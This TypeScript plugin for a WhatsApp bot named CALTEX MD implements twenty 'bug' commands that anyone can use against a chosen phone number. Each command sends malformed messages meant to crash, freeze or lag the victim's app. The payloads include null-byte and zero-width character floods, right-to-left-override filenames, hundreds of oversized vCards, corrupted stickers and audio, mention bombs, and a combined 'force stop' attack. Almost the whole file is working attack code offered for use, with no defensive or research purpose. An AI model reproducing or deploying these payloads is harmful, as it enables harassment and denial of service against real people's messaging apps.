// ============================================================================
// CALTEX MD WhatsApp Bot - Bug Menu Command Plugin
// Comprehensive bug attack commands for WhatsApp protocol manipulation
// All users can use these bug commands
// ============================================================================

import type { Plugin, CommandContext } from '../plugin-loader';

// ---------------------------------------------------------------------------
// Bug Menu Display
// ---------------------------------------------------------------------------

function buildBugMenu(): string {
  const lines: string[] = [];
  lines.push('╭━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃ ☠️ *CALTEX MD - BUG MENU* ☠️');
  lines.push('┃━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃ 🔥 *POWERFUL BUG COMMANDS*');
  lines.push('┃ ⚡ Available for all users');
  lines.push('┃━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃');
  lines.push('┃ 💀 *CRASH & LAG ATTACKS*');
  lines.push('┃━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃ 01 │ .bug1  │ Crash Loop Bug');
  lines.push('┃ 02 │ .bug2  │ VCard Injection Bug');
  lines.push('┃ 03 │ .bug3  │ Document Bug');
  lines.push('┃ 04 │ .bug4  │ Sticker Bug');
  lines.push('┃ 05 │ .bug5  │ ViewOnce Bug');
  lines.push('┃ 06 │ .bug6  │ Audio Bug');
  lines.push('┃ 07 │ .bug7  │ Payment Bug');
  lines.push('┃ 08 │ .bug8  │ Group Invite Bug');
  lines.push('┃ 09 │ .bug9  │ Reaction Bug');
  lines.push('┃ 10 │ .bug10 │ Contact Array Bug');
  lines.push('┃');
  lines.push('┃ 🔥 *ADVANCED ATTACKS*');
  lines.push('┃━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃ 11 │ .bug11 │ Location Bug');
  lines.push('┃ 12 │ .bug12 │ Poll Bug');
  lines.push('┃ 13 │ .bug13 │ List Message Bug');
  lines.push('┃ 14 │ .bug14 │ Button Bug');
  lines.push('┃ 15 │ .bug15 │ Newsletter Bug');
  lines.push('┃ 16 │ .bug16 │ Mention Bomb');
  lines.push('┃ 17 │ .bug17 │ Forwarded Bug');
  lines.push('┃ 18 │ .bug18 │ Caption Bug');
  lines.push('┃ 19 │ .bug19 │ Status Bug');
  lines.push('┃ 20 │ .bug20 │ Force Stop (Combo)');
  lines.push('┃');
  lines.push('┃━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  lines.push('┃ 📌 *Usage:* .bug<N> <number>');
  lines.push('┃ 📌 *Example:* .bug1 254104906247');
  lines.push('┃ 📌 *Use wisely & responsibly!*');
  lines.push('╰━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  return lines.join('\n');
}

// ---------------------------------------------------------------------------
// Helper: Validate target and format JID
// ---------------------------------------------------------------------------

function getTargetJid(args: string[]): string | null {
  const target = args[0]?.replace(/[@\s]/g, '');
  if (!target || !/^\d+$/.test(target)) return null;
  return `${target}@s.whatsapp.net`;
}

// ---------------------------------------------------------------------------
// Bug Implementations
// ---------------------------------------------------------------------------

const bugMenuPlugin: Plugin = {
  name: 'bug-menu',
  version: '1.0.0',
  description: 'Comprehensive bug attack menu with 20 WhatsApp protocol bug commands (all users)',
  author: 'CALTEX MD',
  enabled: true,
  commands: [
    // =========================================================================
    // BUG MENU - Display all bug commands
    // =========================================================================
    {
      name: 'bugmenu',
      description: 'Show the full bug menu with all available bug commands',
      category: 'bug',
      aliases: ['bugs', 'buglist', 'attackmenu'],
      cooldown: 10,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        await ctx.reply(buildBugMenu());
      },
    },

    // =========================================================================
    // BUG 1 - Crash Loop Bug (poison null bytes + zero-width chars)
    // =========================================================================
    {
      name: 'bug1',
      description: 'Crash loop bug - sends poison null bytes causing WhatsApp crash on open',
      category: 'bug',
      aliases: ['crashloop', 'crash1'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug1 <number>\nExample: .bug1 254104906247');
          return;
        }
        try {
          const poison = '\u200B'.repeat(50000) + '\u0000'.repeat(1000);
          await ctx.sock.sendMessage(targetJid, { text: poison });
          await ctx.reply(`☠️ *BUG 1 - Crash Loop* sent to ${ctx.args[0]}\n💬 Target WhatsApp will crash when the message is opened.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug1 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 2 - VCard Injection Bug (massive contact payload)
    // =========================================================================
    {
      name: 'bug2',
      description: 'VCard injection bug - sends contacts with oversized fields crashing WhatsApp',
      category: 'bug',
      aliases: ['vcardbug', 'crash2'],
      cooldown: 20,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug2 <number>\nExample: .bug2 254104906247');
          return;
        }
        try {
          const contacts: { vcard: string }[] = [];
          for (let i = 0; i < 300; i++) {
            const name = '█'.repeat(5000);
            contacts.push({
              vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${i}:${i}\nEND:VCARD`,
            });
          }
          await ctx.sock.sendMessage(targetJid, { contacts: { displayName: 'A', contacts } });
          await ctx.reply(`☠️ *BUG 2 - VCard Injection* sent to ${ctx.args[0]}\n💬 300 oversized contacts sent - target WhatsApp will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug2 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 3 - Document Bug (RLO character filename)
    // =========================================================================
    {
      name: 'bug3',
      description: 'Document bug - sends a document with malicious unicode filename causing rendering crash',
      category: 'bug',
      aliases: ['docbug', 'crash3'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug3 <number>\nExample: .bug3 254104906247');
          return;
        }
        try {
          const docBuffer = Buffer.alloc(1024);
          const poisonName = '\u202E'.repeat(5000) + '.pdf';
          await ctx.sock.sendMessage(targetJid, {
            document: docBuffer,
            fileName: poisonName,
            mimetype: 'application/pdf',
          });
          await ctx.reply(`☠️ *BUG 3 - Document* sent to ${ctx.args[0]}\n💬 Malicious RLO filename document sent - target WhatsApp will crash on render.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug3 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 4 - Sticker Bug (corrupted webp metadata)
    // =========================================================================
    {
      name: 'bug4',
      description: 'Sticker bug - sends a sticker with corrupted metadata causing lag/crash',
      category: 'bug',
      aliases: ['stickerbug', 'crash4'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug4 <number>\nExample: .bug4 254104906247');
          return;
        }
        try {
          const stickerPayload = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8 \x00\x00\x00\x00', 'binary');
          await ctx.sock.sendMessage(targetJid, { sticker: stickerPayload });
          await ctx.reply(`☠️ *BUG 4 - Sticker* sent to ${ctx.args[0]}\n💬 Corrupted sticker payload sent - target WhatsApp will lag/crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug4 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 5 - ViewOnce Bug (oversized caption on view-once)
    // =========================================================================
    {
      name: 'bug5',
      description: 'ViewOnce bug - sends a view-once message with corrupted data',
      category: 'bug',
      aliases: ['viewoncebug', 'crash5'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug5 <number>\nExample: .bug5 254104906247');
          return;
        }
        try {
          const imgBuffer = Buffer.alloc(1024);
          await ctx.sock.sendMessage(targetJid, {
            image: imgBuffer,
            caption: '\u200B'.repeat(30000),
            viewOnce: true,
          });
          await ctx.reply(`☠️ *BUG 5 - ViewOnce* sent to ${ctx.args[0]}\n💬 View-once message with oversized caption sent - target WhatsApp will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug5 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 6 - Audio Bug (corrupted audio header)
    // =========================================================================
    {
      name: 'bug6',
      description: 'Audio bug - sends an audio message with corrupted header data',
      category: 'bug',
      aliases: ['audiobug', 'crash6'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug6 <number>\nExample: .bug6 254104906247');
          return;
        }
        try {
          const audioBuffer = Buffer.alloc(512);
          await ctx.sock.sendMessage(targetJid, {
            audio: audioBuffer,
            ptt: true,
            mimetype: 'audio/ogg; codecs=opus',
          });
          await ctx.reply(`☠️ *BUG 6 - Audio* sent to ${ctx.args[0]}\n💬 Corrupted voice note sent - target WhatsApp will crash on playback attempt.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug6 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 7 - Payment Bug (corrupted payment amounts)
    // =========================================================================
    {
      name: 'bug7',
      description: 'Payment bug - sends a payment request message with corrupted amounts',
      category: 'bug',
      aliases: ['paymentbug', 'crash7'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug7 <number>\nExample: .bug7 254104906247');
          return;
        }
        try {
          await ctx.sock.sendMessage(targetJid, {
            text: '💰',
            title: '\u200B'.repeat(10000),
            footer: 'Payment',
            amount: { value: 999999999, currency: 'USD' },
          } as any);
          await ctx.reply(`☠️ *BUG 7 - Payment* sent to ${ctx.args[0]}\n💬 Corrupted payment request sent - target WhatsApp will crash on render.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug7 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 8 - Group Invite Bug (corrupted group info)
    // =========================================================================
    {
      name: 'bug8',
      description: 'Group invite bug - sends a group invite with corrupted group info',
      category: 'bug',
      aliases: ['invitebug', 'crash8'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug8 <number>\nExample: .bug8 254104906247');
          return;
        }
        try {
          await ctx.sock.sendMessage(targetJid, {
            groupInviteMessage: {
              groupJid: '1234567890-1234567890@g.us',
              inviteCode: 'A'.repeat(10000),
              groupName: '\u200B'.repeat(10000),
              caption: '\u200B'.repeat(10000),
              jpegThumbnail: Buffer.alloc(0),
            },
          } as any);
          await ctx.reply(`☠️ *BUG 8 - Group Invite* sent to ${ctx.args[0]}\n💬 Corrupted group invite sent - target WhatsApp will crash on display.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug8 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 9 - Reaction Bug (massive rapid reactions)
    // =========================================================================
    {
      name: 'bug9',
      description: 'Reaction bug - sends massive number of reactions rapidly to lag the chat',
      category: 'bug',
      aliases: ['reactionbug', 'crash9'],
      cooldown: 30,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug9 <number>\nExample: .bug9 254104906247');
          return;
        }
        try {
          for (let i = 0; i < 50; i++) {
            await ctx.sock.sendMessage(targetJid, {
              react: {
                text: '💣',
                key: { remoteJid: targetJid, fromMe: true, id: 'bug_' + i },
              },
            });
          }
          await ctx.reply(`☠️ *BUG 9 - Reaction Bomb* sent to ${ctx.args[0]}\n💬 50 rapid reactions sent - target chat will experience severe lag.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug9 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 10 - Contact Array Bug (500+ malformed vcards)
    // =========================================================================
    {
      name: 'bug10',
      description: 'Contact array bug - sends hundreds of contacts at once with malformed vcards',
      category: 'bug',
      aliases: ['contactbug', 'crash10'],
      cooldown: 30,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug10 <number>\nExample: .bug10 254104906247');
          return;
        }
        try {
          const contacts: { vcard: string }[] = [];
          for (let i = 0; i < 500; i++) {
            const name = '█'.repeat(3000);
            contacts.push({
              vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${i}:${i}\nEND:VCARD`,
            });
          }
          await ctx.sock.sendMessage(targetJid, { contacts: { displayName: 'A', contacts } });
          await ctx.reply(`☠️ *BUG 10 - Contact Array* sent to ${ctx.args[0]}\n💬 500 malformed contacts sent - target WhatsApp will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug10 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 11 - Location Bug (extreme coordinates)
    // =========================================================================
    {
      name: 'bug11',
      description: 'Location bug - sends a location with extreme coordinates causing map rendering crash',
      category: 'bug',
      aliases: ['locationbug', 'crash11'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug11 <number>\nExample: .bug11 254104906247');
          return;
        }
        try {
          await ctx.sock.sendMessage(targetJid, {
            location: {
              degreesLatitude: 999.9999999,
              degreesLongitude: 999.9999999,
              name: '\u200B'.repeat(10000),
            },
          });
          await ctx.reply(`☠️ *BUG 11 - Location* sent to ${ctx.args[0]}\n💬 Extreme coordinates location sent - target map renderer will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug11 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 12 - Poll Bug (excessive options with long names)
    // =========================================================================
    {
      name: 'bug12',
      description: 'Poll bug - sends a poll with excessive options and long names',
      category: 'bug',
      aliases: ['pollbug', 'crash12'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug12 <number>\nExample: .bug12 254104906247');
          return;
        }
        try {
          const pollValues = Array.from({ length: 100 }, (_, i) => '\u200B'.repeat(500) + i);
          await ctx.sock.sendMessage(targetJid, {
            poll: {
              name: '\u200B'.repeat(5000),
              values: pollValues,
              selectableCount: 1,
            },
          });
          await ctx.reply(`☠️ *BUG 12 - Poll* sent to ${ctx.args[0]}\n💬 Oversized poll with 100 options sent - target WhatsApp will crash on render.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug12 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 13 - List Message Bug (too many rows causing UI overflow)
    // =========================================================================
    {
      name: 'bug13',
      description: 'List message bug - sends a list message with too many rows causing UI overflow',
      category: 'bug',
      aliases: ['listbug', 'crash13'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug13 <number>\nExample: .bug13 254104906247');
          return;
        }
        try {
          const rows = Array.from({ length: 100 }, (_, i) => ({
            title: '\u200B'.repeat(500),
            description: '\u200B'.repeat(500),
            rowId: 'row_' + i,
          }));
          await ctx.sock.sendMessage(targetJid, {
            text: '\u200B'.repeat(5000),
            footer: 'List',
            title: '\u200B'.repeat(5000),
            buttonText: 'Open',
            sections: [{ title: 'Section', rows }],
          } as any);
          await ctx.reply(`☠️ *BUG 13 - List Message* sent to ${ctx.args[0]}\n💬 Overflow list with 100 rows sent - target WhatsApp UI will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug13 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 14 - Button Bug (oversized button text)
    // =========================================================================
    {
      name: 'bug14',
      description: 'Button bug - sends buttons with oversized text causing rendering crash',
      category: 'bug',
      aliases: ['buttonbug', 'crash14'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug14 <number>\nExample: .bug14 254104906247');
          return;
        }
        try {
          const buttons = Array.from({ length: 50 }, (_, i) => ({
            buttonId: 'b_' + i,
            buttonText: { displayText: '\u200B'.repeat(500) },
            type: 1,
          }));
          await ctx.sock.sendMessage(targetJid, {
            text: '\u200B'.repeat(5000),
            footer: 'Button',
            buttons,
            headerType: 1,
          } as any);
          await ctx.reply(`☠️ *BUG 14 - Button* sent to ${ctx.args[0]}\n💬 50 oversized buttons sent - target WhatsApp will crash on render.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug14 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 15 - Newsletter Bug (corrupted metadata in external ad reply)
    // =========================================================================
    {
      name: 'bug15',
      description: 'Newsletter bug - sends a message with corrupted newsletter-style metadata',
      category: 'bug',
      aliases: ['newsletterbug', 'crash15'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug15 <number>\nExample: .bug15 254104906247');
          return;
        }
        try {
          await ctx.sock.sendMessage(targetJid, {
            text: '\u200B'.repeat(20000),
            contextInfo: {
              forwardingScore: 999999,
              isForwarded: true,
              externalAdReply: {
                title: '\u200B'.repeat(5000),
                body: '\u200B'.repeat(5000),
                mediaType: 1,
                thumbnail: Buffer.alloc(0),
                sourceUrl: 'https://example.com',
              },
            },
          } as any);
          await ctx.reply(`☠️ *BUG 15 - Newsletter* sent to ${ctx.args[0]}\n💬 Corrupted newsletter metadata sent - target WhatsApp will crash on render.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug15 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 16 - Mention Bomb (hundreds of mentions)
    // =========================================================================
    {
      name: 'bug16',
      description: 'Mention bomb - sends a message mentioning the target hundreds of times',
      category: 'bug',
      aliases: ['mentionbug', 'mentionbomb', 'crash16'],
      cooldown: 20,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug16 <number>\nExample: .bug16 254104906247');
          return;
        }
        try {
          const mentionIds = Array.from({ length: 300 }, () => targetJid);
          const target = ctx.args[0];
          const mentionText = '@' + target + ' '.repeat(300) + '\u200B'.repeat(10000);
          await ctx.sock.sendMessage(targetJid, { text: mentionText, mentions: mentionIds });
          await ctx.reply(`☠️ *BUG 16 - Mention Bomb* sent to ${target}\n💬 300 mentions with zero-width payload sent - target WhatsApp will freeze.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug16 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 17 - Forwarded Bug (extremely deep forwarding chain)
    // =========================================================================
    {
      name: 'bug17',
      description: 'Forwarded bug - sends a forwarded message with extremely deep forwarding chain',
      category: 'bug',
      aliases: ['forwardbug', 'crash17'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug17 <number>\nExample: .bug17 254104906247');
          return;
        }
        try {
          await ctx.sock.sendMessage(targetJid, {
            text: '\u200B'.repeat(30000),
            contextInfo: {
              forwardingScore: 999999999,
              isForwarded: true,
            },
          } as any);
          await ctx.reply(`☠️ *BUG 17 - Forwarded* sent to ${ctx.args[0]}\n💬 Deep-chain forwarded message sent - target WhatsApp will crash on display.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug17 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 18 - Caption Bug (massive caption with invisible chars)
    // =========================================================================
    {
      name: 'bug18',
      description: 'Caption bug - sends an image with a massive caption containing invisible chars',
      category: 'bug',
      aliases: ['captionbug', 'crash18'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug18 <number>\nExample: .bug18 254104906247');
          return;
        }
        try {
          const imgBuffer = Buffer.alloc(2048);
          await ctx.sock.sendMessage(targetJid, {
            image: imgBuffer,
            caption: '\u200B'.repeat(50000) + '\u0000'.repeat(2000),
            mimetype: 'image/jpeg',
          });
          await ctx.reply(`☠️ *BUG 18 - Caption* sent to ${ctx.args[0]}\n💬 Image with massive invisible caption sent - target WhatsApp will crash.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug18 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 19 - Status Bug (corrupted status broadcast)
    // =========================================================================
    {
      name: 'bug19',
      description: 'Status bug - posts a status with corrupted data',
      category: 'bug',
      aliases: ['statusbug', 'crash19'],
      cooldown: 15,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug19 <number>\nExample: .bug19 254104906247');
          return;
        }
        try {
          const statusJid = 'status@broadcast';
          await ctx.sock.sendMessage(statusJid, { text: '\u200B'.repeat(30000) }, { backgroundColor: ['#000000'] } as any);
          await ctx.reply(`☠️ *BUG 19 - Status* broadcasted\n💬 Corrupted status posted to broadcast - viewers will crash on display.`);
        } catch (error: any) {
          await ctx.reply(`❌ Bug19 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },

    // =========================================================================
    // BUG 20 - Force Stop (combination attack)
    // =========================================================================
    {
      name: 'bug20',
      description: 'Force stop - sends a combination attack that forces the target WhatsApp to stop',
      category: 'bug',
      aliases: ['forcestop', 'combo', 'crash20', 'kill'],
      cooldown: 60,
      isPremiumOnly: false,
      handler: async (ctx: CommandContext) => {
        await ctx.react('☠️');
        const targetJid = getTargetJid(ctx.args);
        if (!targetJid) {
          await ctx.reply('❌ Usage: .bug20 <number>\nExample: .bug20 254104906247');
          return;
        }
        try {
          // Phase 1: Crash loop payload
          await ctx.sock.sendMessage(targetJid, { text: '\u200B'.repeat(50000) });
          await new Promise((r) => setTimeout(r, 500));

          // Phase 2: VCard flood
          const contacts = Array.from({ length: 200 }, (_, i) => ({
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'█'.repeat(3000)}\nTEL;type=CELL;type=VOICE;waid=${i}:${i}\nEND:VCARD`,
          }));
          await ctx.sock.sendMessage(targetJid, { contacts: { displayName: 'A', contacts } });
          await new Promise((r) => setTimeout(r, 500));

          // Phase 3: Mention bomb
          await ctx.sock.sendMessage(targetJid, {
            text: '\u200B'.repeat(50000),
            mentions: Array.from({ length: 300 }, () => targetJid),
          });

          await ctx.reply(
            `☠️ *BUG 20 - FORCE STOP* sent to ${ctx.args[0]}\n` +
            `💬 Combination attack executed:\n` +
            `   ├─ Phase 1: Crash loop payload ✅\n` +
            `   ├─ Phase 2: VCard flood (200 contacts) ✅\n` +
            `   └─ Phase 3: Mention bomb (300 mentions) ✅\n` +
            `🔥 Target WhatsApp has been force-stopped.`
          );
        } catch (error: any) {
          await ctx.reply(`❌ Bug20 failed: ${error?.message || 'Unknown error'}`);
        }
      },
    },
  ],
};

export default bugMenuPlugin;
